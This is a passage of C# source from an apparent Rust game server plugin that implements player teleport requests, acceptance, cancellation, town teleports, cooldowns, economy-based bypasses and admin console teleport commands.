                    PrintMsgL(player, "MultiplePlayers", GetMultiplePlayers(targets));
                    return;
                }

                target = targets[0];
            }

            if (target == player)
            {
#if DEBUG
                Puts("Debug mode - allowing self teleport.");
#else
                PrintMsgL(player, "CantTeleportToSelf");
                return;
#endif
            }
#if DEBUG
            Puts("Calling CheckPlayer from cmdChatTeleportRequest");
#endif

            var err = CheckPlayer(player, config.TPR.UsableOutOfBuildingBlocked, CanCraftTPR(player), true, "tpr");
            if (err != null)
            {
                PrintMsgL(player, err);
                return;
            }
            var err2 = CheckPlayer(target, config.TPR.UsableIntoBuildingBlocked, CanCraftTPR(target), true, "tpr");
            if (err2 != null)
            {
                string error = string.Format(lang.GetMessage("ErrorTPR", this, player.UserIDString), target.displayName, err);
                PrintMsg(player, error);
                return;
            }
            err = CheckTargetLocation(target, target.transform.position, config.TPR.UsableIntoBuildingBlocked, config.TPR.CupOwnerAllowOnBuildingBlocked);
            if (err != null)
            {
                PrintMsgL(player, err);
                return;
            }
            var timestamp = Facepunch.Math.Epoch.Current;
            var currentDate = DateTime.Now.ToString("d");
            TeleportData tprData;
            if (!_TPR.TryGetValue(player.userID, out tprData))
                _TPR[player.userID] = tprData = new TeleportData();
            if (tprData.Date != currentDate)
            {
                tprData.Amount = 0;
                tprData.Date = currentDate;
            }

            var cooldown = GetLower(player, config.TPR.VIPCooldowns, config.TPR.Cooldown);
            if (cooldown > 0 && timestamp - tprData.Timestamp < cooldown)
            {
                var cmdSent = args.Length >= 2 ? args[1].ToLower() : string.Empty;

                if (!string.IsNullOrEmpty(config.Settings.BypassCMD))
                {
                    if (cmdSent == config.Settings.BypassCMD.ToLower() && config.TPR.Bypass > -1)
                    {
                        if (CheckEconomy(player, config.TPR.Bypass))
                        {
                            CheckEconomy(player, config.TPR.Bypass, true);

                            if (config.TPR.Bypass > 0)
                            {
                                PrintMsgL(player, "TPRCooldownBypass", config.TPR.Bypass);
                            }

                            if (config.TPR.Pay > 0)
                            {
                                PrintMsgL(player, "PayToTPR", config.TPR.Pay);
                            }
                        }
                        else
                        {
                            PrintMsgL(player, "TPRCooldownBypassF", config.TPR.Bypass);
                            return;
                        }
                    }
                    else if (UseEconomy())
                    {
                        var remain = cooldown - (timestamp - tprData.Timestamp);
                        PrintMsgL(player, "TPRCooldown", FormatTime(player, remain));
                        if (config.TPR.Bypass > -1)
                        {
                            if (config.TPR.Bypass > 0)
                            {
                                PrintMsgL(player, "TPRCooldownBypassP", config.TPR.Bypass);

                                if (config.TPR.Pay > 0)
                                {
                                    PrintMsgL(player, "PayToTPR", config.TPR.Pay);
                                }

                                PrintMsgL(player, "TPRCooldownBypassP2a", config.Settings.BypassCMD);
                                return;
                            }
                        }
                        else return;
                    }
                    else
                    {
                        var remain = cooldown - (timestamp - tprData.Timestamp);
                        PrintMsgL(player, "TPRCooldown", FormatTime(player, remain));
                        return;
                    }
                }
                else
                {
                    var remain = cooldown - (timestamp - tprData.Timestamp);
                    PrintMsgL(player, "TPRCooldown", FormatTime(player, remain));
                    return;
                }
            }

            var limit = GetHigher(player, config.TPR.VIPDailyLimits, config.TPR.DailyLimit, true);
            if (limit > 0 && tprData.Amount >= limit)
            {
                PrintMsgL(player, "TPRLimitReached", limit);
                return;
            }
            if (TeleportTimers.ContainsKey(player.userID))
            {
                PrintMsgL(player, "TeleportPendingTPC");
                return;
            }
            if (TeleportTimers.ContainsKey(target.userID))
            {
                PrintMsgL(player, "TeleportPendingTarget");
                return;
            }
            if (PlayersRequests.ContainsKey(player.userID))
            {
                PrintMsgL(player, "PendingRequest");
                return;
            }
            if (PlayersRequests.ContainsKey(target.userID))
            {
                PrintMsgL(player, "PendingRequestTarget");
                return;
            }
            err = CanPlayerTeleport(player, target.transform.position);
            if (err != null)
            {
                SendReply(player, err);
                return;
            }
            err = CanPlayerTeleport(target, player.transform.position);
            if (err != null)
            {
                PrintMsgL(player, string.IsNullOrEmpty(err) ? "TPRTarget" : err);
                return;
            }
            err = CheckItems(player);
            if (err != null)
            {
                PrintMsgL(player, "TPBlockedItem", err);
                return;
            }

            if (config.TPR.UseClans_Friends_Teams)
            {
                if (IsInSameClan(player.UserIDString, target.UserIDString) || AreFriends(player.UserIDString, target.UserIDString) || IsOnSameTeam(player.userID, target.userID))
                {
                    PlayersRequests[player.userID] = target;
                    PlayersRequests[target.userID] = player;
                    PendingRequests[target.userID] = timer.Once(config.TPR.RequestDuration, () => { RequestTimedOut(player, target); });
                    PrintMsgL(player, "Request", target.displayName);
                    PrintMsgL(target, "RequestTarget", player.displayName);
                    Interface.CallHook("OnTeleportRequested", target, player);
                }
                else
                {
                    PrintMsgL(player, "TPR_NoClan_NoFriend_NoTeam");
                }
            }
            else
            {
                PlayersRequests[player.userID] = target;
                PlayersRequests[target.userID] = player;
                PendingRequests[target.userID] = timer.Once(config.TPR.RequestDuration, () => { RequestTimedOut(player, target); });
                PrintMsgL(player, "Request", target.displayName);
                PrintMsgL(target, "RequestTarget", player.displayName);
                Interface.CallHook("OnTeleportRequested", target, player);
            }
        }

        private void CommandTeleportAccept(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            if (!config.Settings.TPREnabled) { user.Reply("TPR is not enabled in the config."); return; }
            var player = user.Object as BasePlayer;
            if (!player || !player.IsConnected || player.IsSleeping()) return;
            if (args.Length != 0)
            {
                PrintMsgL(player, "SyntaxCommandTPA");
                return;
            }
            Timer reqTimer;
            if (!PendingRequests.TryGetValue(player.userID, out reqTimer))
            {
                PrintMsgL(player, "NoPendingRequest");
                return;
            }
#if DEBUG
            Puts("Calling CheckPlayer from cmdChatTeleportAccept");
#endif
            var err = CheckPlayer(player, config.TPR.UsableIntoBuildingBlocked, CanCraftTPR(player), false, "tpa");
            if (err != null)
            {
                PrintMsgL(player, err);
                return;
            }
            var originPlayer = PlayersRequests[player.userID];
            err = CheckPlayer(originPlayer, config.TPR.UsableOutOfBuildingBlocked, CanCraftTPR(originPlayer), true, "tpa");
            if (err != null)
            {
                PrintMsgL(originPlayer, err);
                return;
            }
            err = CheckTargetLocation(originPlayer, player.transform.position, config.TPR.UsableIntoBuildingBlocked, config.TPR.CupOwnerAllowOnBuildingBlocked);
            if (err != null)
            {
                PrintMsgL(player, err);
                return;
            }
            err = CanPlayerTeleport(player, originPlayer.transform.position);
            if (err != null)
            {
                SendReply(player, err);
                return;
            }
            if (config.TPR.BlockTPAOnCeiling)
            {
                if (GetFloor(player.eyes.position).Count > 0)
                {
                    PrintMsgL(player, "AcceptOnRoof");
                    return;
                }
            }
            float globalCooldownTime = GetGlobalCooldown(player);
            if (globalCooldownTime > 0f)
            {
                PrintMsgL(player, "WaitGlobalCooldown", FormatTime(player, (int)globalCooldownTime));
                return;
            }
            if (config.Settings.BlockAuthorizedTeleporting && player.IsBuildingAuthed())
            {
                PrintMsgL(player, "CannotTeleportFromHome");
                return;
            }
            var countdown = GetLower(originPlayer, config.TPR.VIPCountdowns, config.TPR.Countdown);
            PrintMsgL(originPlayer, "Accept", player.displayName, countdown);
            PrintMsgL(player, "AcceptTarget", originPlayer.displayName);
            var timestamp = Facepunch.Math.Epoch.Current;
            TeleportTimers[originPlayer.userID] = new TeleportTimer
            {
                OriginPlayer = originPlayer,
                TargetPlayer = player,
                Timer = timer.Once(countdown, () =>
                {
#if DEBUG
                    Puts("Calling CheckPlayer from cmdChatTeleportAccept timer loop");
#endif
                    if (config.Settings.BlockAuthorizedTeleporting && player.IsBuildingAuthed())
                    {
                        PrintMsgL(player, "CannotTeleportFromHome");
                        return;
                    }
                    err = CheckPlayer(originPlayer, config.TPR.UsableOutOfBuildingBlocked, CanCraftTPR(originPlayer), true, "tpa") ?? CheckPlayer(player, false, CanCraftTPR(player), true, "tpa");
                    if (err != null)
                    {
                        PrintMsgL(player, "InterruptedTarget", originPlayer.displayName);
                        PrintMsgL(originPlayer, "Interrupted");
                        PrintMsgL(originPlayer, err);
                        TeleportTimers.Remove(originPlayer.userID);
                        return;
                    }
                    err = CheckTargetLocation(originPlayer, player.transform.position, config.TPR.UsableIntoBuildingBlocked, config.TPR.CupOwnerAllowOnBuildingBlocked);
                    if (err != null)
                    {
                        PrintMsgL(player, err);
                        PrintMsgL(originPlayer, "Interrupted");
                        PrintMsgL(originPlayer, err);
                        TeleportTimers.Remove(originPlayer.userID);
                        return;
                    }
                    err = CanPlayerTeleport(originPlayer, player.transform.position) ?? CanPlayerTeleport(player, originPlayer.transform.position);
                    if (err != null)
                    {
                        SendReply(player, err);
                        PrintMsgL(originPlayer, "Interrupted");
                        SendReply(originPlayer, err);
                        TeleportTimers.Remove(originPlayer.userID);
                        return;
                    }
                    err = CheckItems(originPlayer);
                    if (err != null)
                    {
                        PrintMsgL(player, "InterruptedTarget", originPlayer.displayName);
                        PrintMsgL(originPlayer, "Interrupted");
                        PrintMsgL(originPlayer, "TPBlockedItem", err);
                        TeleportTimers.Remove(originPlayer.userID);
                        return;
                    }
                    if (UseEconomy())
                    {
                        if (config.TPR.Pay > -1)
                        {
                            if (!CheckEconomy(originPlayer, config.TPR.Pay))
                            {
                                if (config.TPR.Pay > 0)
                                {
                                    PrintMsgL(originPlayer, "TPNoMoney", config.TPR.Pay);
                                }

                                PrintMsgL(player, "InterruptedTarget", originPlayer.displayName);
                                TeleportTimers.Remove(originPlayer.userID);
                                return;
                            }
                            else
                            {
                                CheckEconomy(originPlayer, config.TPR.Pay, true);

                                if (config.TPR.Pay > 0)
                                {
                                    PrintMsgL(originPlayer, "TPMoney", (double)config.TPR.Pay);
                                }
                            }
                        }
                    }
                    Teleport(originPlayer, player.transform.position, config.TPR.AllowTPB);
                    var tprData = _TPR[originPlayer.userID];
                    tprData.Amount++;
                    tprData.Timestamp = timestamp;
                    changedTPR = true;
                    PrintMsgL(player, "SuccessTarget", originPlayer.displayName);
                    PrintMsgL(originPlayer, "Success", player.displayName);
                    var limit = GetHigher(originPlayer, config.TPR.VIPDailyLimits, config.TPR.DailyLimit, true);
                    if (limit > 0) PrintMsgL(originPlayer, "TPRAmount", limit - tprData.Amount);
                    TeleportTimers.Remove(originPlayer.userID);
                })
            };
            reqTimer.Destroy();
            PendingRequests.Remove(player.userID);
            PlayersRequests.Remove(player.userID);
            PlayersRequests.Remove(originPlayer.userID);
        }

        private void CommandWipeHomes(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !IsAllowedMsg(player, PermWipeHomes) || !player.IsConnected || player.IsSleeping()) return;
            _Home.Clear();
            changedHome = true;
            PrintMsgL(player, "HomesListWiped");
        }

        private void CommandTeleportHelp(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !player.IsConnected || player.IsSleeping()) return;
            if (!config.Settings.HomesEnabled && !config.Settings.TPREnabled && !IsAllowedMsg(player)) return;
            if (args.Length == 1)
            {
                var key = $"TPHelp{args[0].ToLower()}";
                var msg = _(key, player);
                if (key.Equals(msg))
                    PrintMsgL(player, "InvalidHelpModule");
                else
                    PrintMsg(player, msg);
            }
            else
            {
                var msg = _("TPHelpGeneral", player);
                if (IsAllowed(player))
                    msg += NewLine + "/tphelp AdminTP";
                if (config.Settings.HomesEnabled)
                    msg += NewLine + "/tphelp Home";
                if (config.Settings.TPREnabled)
                    msg += NewLine + "/tphelp TPR";
                PrintMsg(player, msg);
            }
        }

        private List<string> _tpid = new List<string> { "home", "bandit", "outpost", "tpr", "town" };

        private void CommandTeleportInfo(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !player.IsConnected || player.IsSleeping()) return;
            if (args.Length == 1)
            {
                var module = args[0].ToLower();
                var settings = GetSettings(module);
                var msg = _(_tpid.Contains(module) || settings == null ? $"TPSettings{module}" : "TPSettingsdynamic", player);
                var timestamp = Facepunch.Math.Epoch.Current;
                var currentDate = DateTime.Now.ToString("d");
                int limit;
                int cooldown;

                switch (module)
                {
                    case "home":
                        limit = GetHigher(player, config.Home.VIPDailyLimits, config.Home.DailyLimit, true);
                        cooldown = GetLower(player, config.Home.VIPCooldowns, config.Home.Cooldown);
                        int homeLimits = GetHigher(player, config.Home.VIPHomesLimits, config.Home.HomesLimit, true);
                        PrintMsg(player, string.Format(msg, FormatTime(player, cooldown), limit > 0 ? limit.ToString() : _("Unlimited", player), homeLimits));
                        HomeData homeData;
                        if (!_Home.TryGetValue(player.userID, out homeData))
                            _Home[player.userID] = homeData = new HomeData();
                        if (homeData.Teleports.Date != currentDate)
                        {
                            homeData.Teleports.Amount = 0;
                            homeData.Teleports.Date = currentDate;
                        }
                        if (limit > 0) PrintMsgL(player, "HomeTPAmount", limit - homeData.Teleports.Amount);
                        if (cooldown > 0 && timestamp - homeData.Teleports.Timestamp < cooldown)
                        {
                            var remain = cooldown - (timestamp - homeData.Teleports.Timestamp);
                            PrintMsgL(player, "HomeTPCooldown", FormatTime(player, remain));
                        }
                        break;
                    case "tpr":
                        limit = GetHigher(player, config.TPR.VIPDailyLimits, config.TPR.DailyLimit, true);
                        cooldown = GetLower(player, config.TPR.VIPCooldowns, config.TPR.Cooldown);
                        PrintMsg(player, string.Format(msg, FormatTime(player, cooldown), limit > 0 ? limit.ToString() : _("Unlimited", player)));
                        TeleportData tprData;
                        if (!_TPR.TryGetValue(player.userID, out tprData))
                            _TPR[player.userID] = tprData = new TeleportData();
                        if (tprData.Date != currentDate)
                        {
                            tprData.Amount = 0;
                            tprData.Date = currentDate;
                        }
                        if (limit > 0) PrintMsgL(player, "TPRAmount", limit - tprData.Amount);
                        if (cooldown > 0 && timestamp - tprData.Timestamp < cooldown)
                        {
                            var remain = cooldown - (timestamp - tprData.Timestamp);
                            PrintMsgL(player, "TPRCooldown", FormatTime(player, remain));
                        }
                        break;
                    default: // town island outpost bandit etc
                        if (settings == null)
                        {
                            PrintMsgL(player, "InvalidHelpModule");
                            break;
                        }

                        limit = GetHigher(player, settings.VIPDailyLimits, settings.DailyLimit, true);
                        cooldown = GetLower(player, settings.VIPCooldowns, settings.Cooldown);
                        if (_tpid.Contains(module)) PrintMsg(player, string.Format(msg, FormatTime(player, cooldown), limit > 0 ? limit.ToString() : _("Unlimited", player)));
                        else PrintMsg(player, string.Format(msg, module.SentenceCase(), FormatTime(player, cooldown), limit > 0 ? limit.ToString() : _("Unlimited", player)));
                        TeleportData tpData;
                        if (!settings.Teleports.TPData.TryGetValue(player.userID, out tpData))
                            settings.Teleports.TPData[player.userID] = tpData = new TeleportData();
                        if (tpData.Date != currentDate)
                        {
                            tpData.Amount = 0;
                            tpData.Date = currentDate;
                        }
                        var language = lang.GetMessage(settings.Command, this, user.Id);
                        if (limit > 0) PrintMsgL(player, "DM_TownTPAmount", limit - tpData.Amount, language);
                        if (!string.IsNullOrEmpty(config.Settings.BypassCMD) && cooldown > 0 && timestamp - tpData.Timestamp < cooldown)
                        {
                            var remain = cooldown - (timestamp - tpData.Timestamp);

                            PrintMsgL(player, "DM_TownTPCooldown", FormatTime(player, remain));

                            if (settings.Bypass > 0)
                            {
                                PrintMsgL(player, "DM_TownTPCooldownBypassP", settings.Bypass);
                                PrintMsgL(player, "DM_TownTPCooldownBypassP2", language, config.Settings.BypassCMD);
                            }
                        }
                        break;
                }
            }
            else
            {
                var msg = _("TPInfoGeneral", player);
                if (config.Settings.HomesEnabled)
                    msg += NewLine + "/tpinfo Home";
                if (config.Settings.TPREnabled)
                    msg += NewLine + "/tpinfo TPR";
                foreach (var entry in config.DynamicCommands)
                {
                    if (entry.Value.Enabled)
                    {
                        if (command == "bandit" && !banditEnabled) continue;
                        if (command == "outpost" && !outpostEnabled) continue;
                        if (!IsAllowed(player, $"{Name}.tp{entry.Key}")) continue;
                        msg += NewLine + $"/tpinfo {entry.Key}";
                    }
                }
                PrintMsgL(player, msg);
            }
        }

        private void CommandTeleportCancel(IPlayer user, string command, string[] args)
        {
            var player = user.Object as BasePlayer;
            if (!player || !player.IsConnected || player.IsSleeping()) return;
            if (args.Length != 0)
            {
                PrintMsgL(player, "SyntaxCommandTPC");
                return;
            }
            TeleportTimer teleportTimer;
            if (TeleportTimers.TryGetValue(player.userID, out teleportTimer))
            {
                teleportTimer.Timer?.Destroy();
                PrintMsgL(player, "TPCancelled");
                PrintMsgL(teleportTimer.TargetPlayer, "TPCancelledTarget", player.displayName);
                TeleportTimers.Remove(player.userID);
                return;
            }
            foreach (var keyValuePair in TeleportTimers)
            {
                if (keyValuePair.Value.TargetPlayer != player) continue;
                keyValuePair.Value.Timer?.Destroy();
                PrintMsgL(keyValuePair.Value.OriginPlayer, "TPCancelledTarget", player.displayName);
                PrintMsgL(player, "TPYouCancelledTarget", keyValuePair.Value.OriginPlayer.displayName);
                TeleportTimers.Remove(keyValuePair.Key);
                return;
            }
            BasePlayer target;
            if (!PlayersRequests.TryGetValue(player.userID, out target))
            {
                PrintMsgL(player, "NoPendingRequest");
                return;
            }
            Timer reqTimer;
            if (PendingRequests.TryGetValue(player.userID, out reqTimer))
            {
                reqTimer.Destroy();
                PendingRequests.Remove(player.userID);
            }
            else if (PendingRequests.TryGetValue(target.userID, out reqTimer))
            {
                reqTimer.Destroy();
                PendingRequests.Remove(target.userID);
                var temp = player;
                player = target;
                target = temp;
            }
            PlayersRequests.Remove(target.userID);
            PlayersRequests.Remove(player.userID);
            PrintMsgL(player, "Cancelled", target.displayName);
            PrintMsgL(target, "CancelledTarget", player.displayName);
        }

        private void CommandDynamic(IPlayer user, string command, string[] args)
        {
            if (!user.HasPermission(PermAdmin) || args.Length != 2 || args[0].Equals("list", StringComparison.OrdinalIgnoreCase))
            {
                CommandTeleportInfo(user, command, args);
                return;
            }

            var value = args[1].ToLower();

            if (args[0].Equals("add", StringComparison.OrdinalIgnoreCase))
            {
                TownSettings settings;
                if (GetSettings(value) == null)
                {
                    config.DynamicCommands.Add(value, settings = new TownSettings());
                    RegisterCommand(value, settings, true);
                    RegisterCommand(value, nameof(CommandCustom));
                    PrintMsgL(user, "DM_TownTPCreated", value);
                    SaveConfig();
                }
                else PrintMsgL(user, "DM_TownTPExists", value);
            }
            else if (args[0].Equals("remove", StringComparison.OrdinalIgnoreCase))
            {
                var key = config.DynamicCommands.Keys.FirstOrDefault(x => x.Equals(value, StringComparison.OrdinalIgnoreCase));

                if (!string.IsNullOrEmpty(key))
                {
                    PrintMsgL(user, "DM_TownTPRemoved", key);
                    config.DynamicCommands.Remove(key);
                    UnregisterCommand(value);
                    SaveConfig();
                }
                else PrintMsgL(user, "DM_TownTPDoesNotExist", value);
            }
            else CommandTeleportInfo(user, command, args);
        }

        private void CommandCustom(IPlayer user, string command, string[] args)
        {
            CommandTown(user, command, args);
        }

        private TownSettings GetSettings(string command, ulong userid = 0uL)
        {
            if (command.Equals("home", StringComparison.OrdinalIgnoreCase) && _Home.ContainsKey(userid))
            {
                return new TownSettings
                {
                    VIPCooldowns = config.Home.VIPCooldowns,
                    Cooldown = config.Home.Cooldown,
                    Countdown = config.Home.Countdown,
                    Teleports = new StoredData
                    {
                        TPData = new Dictionary<ulong, TeleportData>
                        {
                            [userid] = _Home[userid].Teleports
                        }
                    }
                };
            }

            if (command.Equals("tpr", StringComparison.OrdinalIgnoreCase) && _TPR.ContainsKey(userid))
            {
                return new TownSettings
                {
                    VIPCooldowns = config.TPR.VIPCooldowns,
                    Cooldown = config.TPR.Cooldown,
                    Countdown = config.TPR.Countdown,
                    Teleports = new StoredData
                    {
                        TPData = new Dictionary<ulong, TeleportData>
                        {
                            [userid] = _TPR[userid]
                        }
                    }
                };
            }

            foreach (var x in config.DynamicCommands)
            {
                if (x.Key.Equals(command, StringComparison.OrdinalIgnoreCase))
                {
                    return x.Value;
                }
            }

            return null;
        }

        private void CommandTown(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command)) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !player.IsConnected || player.IsSleeping()) return;
#if DEBUG
            Puts($"cmdChatTown: command={command}");
#endif
            if (!IsAllowedMsg(player, $"{Name}.tp{command}".ToLower())) return;

            float globalCooldownTime = GetGlobalCooldown(player);
            if (globalCooldownTime > 0f)
            {
                PrintMsgL(player, "WaitGlobalCooldown", FormatTime(player, (int)globalCooldownTime));
                return;
            }
            
            if (config.Settings.BlockAuthorizedTeleporting && player.IsBuildingAuthed())
            {
                PrintMsgL(player, "CannotTeleportFromHome");
                return;
            }

            var settings = GetSettings(command);

            if (settings == null)
            {
                return;
            }

            var language = lang.GetMessage(settings.Command, this, user.Id);

            // For admin using set, add, clear or show command locations
            if (args.Length >= 1 && IsAllowed(player, PermAdmin))
            {
                var param = args[0].ToLower();

                if (param.Equals("clear"))
                {
                    settings.Location = Vector3.zero;
                    settings.Locations.Clear();
                    SaveConfig();
                    PrintMsgL(player, "DM_TownTPLocationsCleared", language);
                    return;
                }
                else if (param.Equals("set"))
                {
                    if (settings.Locations.Count > 0)
                    {
                        settings.Locations.RemoveAt(0);
                    }
                    var position = player.transform.position;
                    settings.Locations.Insert(0, settings.Location = position);
                    SaveConfig();
                    PrintMsgL(player, "DM_TownTPLocation", language, position);
                    return;
                }
                else if (param.Equals("add"))
                {
                    var position = player.transform.position;
                    int num = settings.Locations.RemoveAll(x => Vector3.Distance(position, x) < 25f);
                    settings.Locations.Add(position);
                    SaveConfig();
                    PrintMsgL(player, "DM_TownTPLocation", language, position);
                    return;
                }
                else if (args[0].Equals("show", StringComparison.OrdinalIgnoreCase))
                {
                    settings.Locations.ForEach(x => player.SendConsoleCommand("ddraw.text", 30f, Color.green, x, command));
                    return;
                }
            }

            bool paidmoney = false;

            // Is command usage enabled?
            if (!settings.Enabled)
            {
                PrintMsgL(player, "DM_TownTPDisabled", language.SentenceCase());
                return;
            }

            if (settings.Location != Vector3.zero && !settings.Locations.Contains(settings.Location))
            {
                settings.Locations.Add(settings.Location);
            }

            // Is location set?
            if (settings.Locations.Count == 0)
            {
                PrintMsgL(player, "DM_TownTPNoLocation", language.SentenceCase());
                return;
            }

            // Are they trying to bypass cooldown or did they just type something else?
            if (args.Length == 1 && !string.IsNullOrEmpty(config.Settings.BypassCMD) && args[0].ToLower() != config.Settings.BypassCMD.ToLower() && !args[0].All(char.IsDigit))
            {
                string com = command ?? "town";
                string msg = "SyntaxCommand" + char.ToUpper(com[0]) + com.Substring(1);
                PrintMsgL(player, msg);
                if (IsAllowed(player)) PrintMsgL(player, msg + "Admin");
                return;
            }

            TeleportData teleportData;
            var timestamp = Facepunch.Math.Epoch.Current;
            var currentDate = DateTime.Now.ToString("d");

            // Setup vars for checks below
            var err = CheckPlayer(player, settings.UsableOutOfBuildingBlocked, settings.CanCraft(player, command), true, command);

            if (err != null)
            {
                PrintMsgL(player, err);
                return;
            }

            var cooldown = GetLower(player, settings.VIPCooldowns, settings.Cooldown);

            if (!settings.Teleports.TPData.TryGetValue(player.userID, out teleportData))
            {
                settings.Teleports.TPData[player.userID] = teleportData = new TeleportData();
            }

            if (teleportData.Date != currentDate)
            {
                teleportData.Amount = 0;
                teleportData.Date = currentDate;
            }

            var limit = GetHigher(player, settings.VIPDailyLimits, settings.DailyLimit, true);
#if DEBUG
            Puts("Calling CheckPlayer from cmdChatTown");
#endif

            // Check and process cooldown, bypass, and payment for all modes
            if (cooldown > 0 && timestamp - teleportData.Timestamp < cooldown)
            {
                var cmdSent = args.Length >= 1 ? args[0].ToLower() : string.Empty;

                if (!string.IsNullOrEmpty(config.Settings.BypassCMD))
                {
                    if (cmdSent == config.Settings.BypassCMD.ToLower() && settings.Bypass > -1)
                    {
                        bool foundmoney = CheckEconomy(player, settings.Bypass);

                        if (foundmoney)
                        {
                            CheckEconomy(player, settings.Bypass, true);
                            paidmoney = true;

                            if (settings.Bypass > 0)
                            {
                                PrintMsgL(player, "DM_TownTPCooldownBypass", settings.Bypass);
                            }

                            if (settings.Pay > 0)
                            {
                                PrintMsgL(player, "PayToTown", settings.Pay, language);
                            }
                        }
                        else
                        {
                            PrintMsgL(player, "DM_TownTPCooldownBypassF", settings.Bypass);
                            return;
                        }
                    }
                    else if (UseEconomy())
                    {
                        var remain = cooldown - (timestamp - teleportData.Timestamp);
                        PrintMsgL(player, "DM_TownTPCooldown", FormatTime(player, remain));
                        if (settings.Bypass > -1)
                        {
                            PrintMsgL(player, "DM_TownTPCooldownBypassP", settings.Bypass);
                            PrintMsgL(player, "DM_TownTPCooldownBypassP2", language, config.Settings.BypassCMD);
                        }
                        return;
                    }
                    else
                    {
                        var remain = cooldown - (timestamp - teleportData.Timestamp);
                        PrintMsgL(player, "DM_TownTPCooldown", FormatTime(player, remain));
                        return;
                    }
                }
                else
                {
                    var remain = cooldown - (timestamp - teleportData.Timestamp);
                    PrintMsgL(player, "DM_TownTPCooldown", FormatTime(player, remain));
                    return;
                }
            }

            if (limit > 0 && teleportData.Amount >= limit)
            {
                var left = FormatTime(player, (int)SecondsUntilTomorrow());
                PrintMsgL(player, "DM_TownTPLimitReached", limit, left);
                return;
            }

            if (TeleportTimers.ContainsKey(player.userID))
            {
                PrintMsgL(player, "TeleportPendingTPC");
                return;
            }

            Vector3 location;
            int index;
            if (args.Length == 1 && int.TryParse(args[0], out index))
            {
                index = Mathf.Clamp(index, 0, settings.Locations.Count - 1);
                location = settings.Locations[index];
            }
            else if (settings.Random)
            {
                location = settings.Locations.GetRandom();
            }
            else location = settings.Locations.First();

            err = CanPlayerTeleport(player, location);

            if (err != null)
            {
                SendReply(player, err);
                return;
            }

            err = CheckItems(player);

            if (err != null)
            {
                PrintMsgL(player, "TPBlockedItem", err);
                return;
            }

            int countdown = 0;
            countdown = GetLower(player, settings.VIPCountdowns, settings.Countdown);
            TeleportTimers[player.userID] = new TeleportTimer
            {
                OriginPlayer = player,
                Timer = timer.Once(countdown, () =>
                {
#if DEBUG
                    Puts($"Calling CheckPlayer from cmdChatTown {command} timer loop");
#endif
                    if (config.Settings.BlockAuthorizedTeleporting && player.IsBuildingAuthed())
                    {
                        PrintMsgL(player, "CannotTeleportFromHome");
                        return;
                    }
                    err = CheckPlayer(player, settings.UsableOutOfBuildingBlocked, settings.CanCraft(player, command.ToLower()), true, command.ToLower(), settings.AllowCave);
                    if (err != null)
                    {
                        Interrupt(player, paidmoney, settings.Bypass);
                        PrintMsgL(player, err);
                        return;
                    }
                    err = CanPlayerTeleport(player, location);
                    if (err != null)
                    {
                        Interrupt(player, paidmoney, settings.Bypass);
                        PrintMsgL(player, err);
                        return;
                    }
                    err = CheckItems(player);
                    if (err != null)
                    {
                        Interrupt(player, paidmoney, settings.Bypass);
                        PrintMsgL(player, "TPBlockedItem", err);
                        return;
                    }
                    if (settings.Locations.Count == 0)
                    {
                        Interrupt(player, paidmoney, settings.Bypass);
                        return;
                    }
                    if (UseEconomy())
                    {
                        if (settings.Pay < 0)
                        {
                            return;
                        }
                        if (settings.Pay > 0 && !CheckEconomy(player, settings.Pay))
                        {
                            Interrupt(player, false, 0);
                            PrintMsgL(player, "TPNoMoney", settings.Pay);
                            return;
                        }
                        if (settings.Pay > -1 && !paidmoney)
                        {
                            CheckEconomy(player, settings.Pay, true);

                            if (settings.Pay > 0)
                            {
                                PrintMsgL(player, "TPMoney", (double)settings.Pay);
                            }
                        }
                    }

                    Teleport(player, location, settings.AllowTPB);

                    teleportData.Amount++;
                    teleportData.Timestamp = timestamp;
                    settings.Teleports.Changed = true;
                    PrintMsgL(player, "DM_TownTP", language);
                    if (limit > 0) PrintMsgL(player, "DM_TownTPAmount", limit - teleportData.Amount, language);
                    TeleportTimers.Remove(player.userID);
                })
            };

            if (countdown > 0)
            {
                PrintMsgL(player, "DM_TownTPStarted", language, countdown);
            }
        }

        private double SecondsUntilTomorrow()
        {
            var tomorrow = DateTime.Now.AddDays(1).Date;
            return (tomorrow - DateTime.Now).TotalSeconds;
        }

        private void Interrupt(BasePlayer player, bool paidmoney, double bypass)
        {
            PrintMsgL(player, "Interrupted");
            if (paidmoney)
            {
                CheckEconomy(player, bypass, false, true);
            }
            TeleportTimers.Remove(player.userID);
        }

        private void CommandTeleportII(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (player != null && (!IsAllowedMsg(player, PermTpConsole) || !player.IsConnected || player.IsSleeping())) return;

            List<BasePlayer> players;
            switch (command)
            {
                case "teleport.topos":
                    if (args.Length < 4)
                    {
                        user.Reply(_("SyntaxConsoleCommandToPos", player));
                        return;
                    }
                    players = FindPlayers(args[0], true);
                    if (players.Count <= 0)
                    {
                        user.Reply(_("PlayerNotFound", player));
                        return;
                    }
                    if (players.Count > 1)
                    {
                        user.Reply(_("MultiplePlayers", player, GetMultiplePlayers(players)));
                        return;
                    }
                    var targetPlayer = players.First();
                    players.Clear();
                    float x;
                    if (!float.TryParse(args[1], out x)) x = -10000f;
                    float y;
                    if (!float.TryParse(args[2], out y)) y = -10000f;
                    float z;
                    if (!float.TryParse(args[3], out z)) z = -10000f;
                    if (!CheckBoundaries(x, y, z))
                    {
                        user.Reply(_("AdminTPOutOfBounds", player) + System.Environment.NewLine + _("AdminTPBoundaries", player, boundary));
                        return;
                    }
                    Teleport(targetPlayer, x, y, z);
                    if (config.Admin.AnnounceTeleportToTarget)
                        PrintMsgL(targetPlayer, "AdminTPConsoleTP", targetPlayer.transform.position);
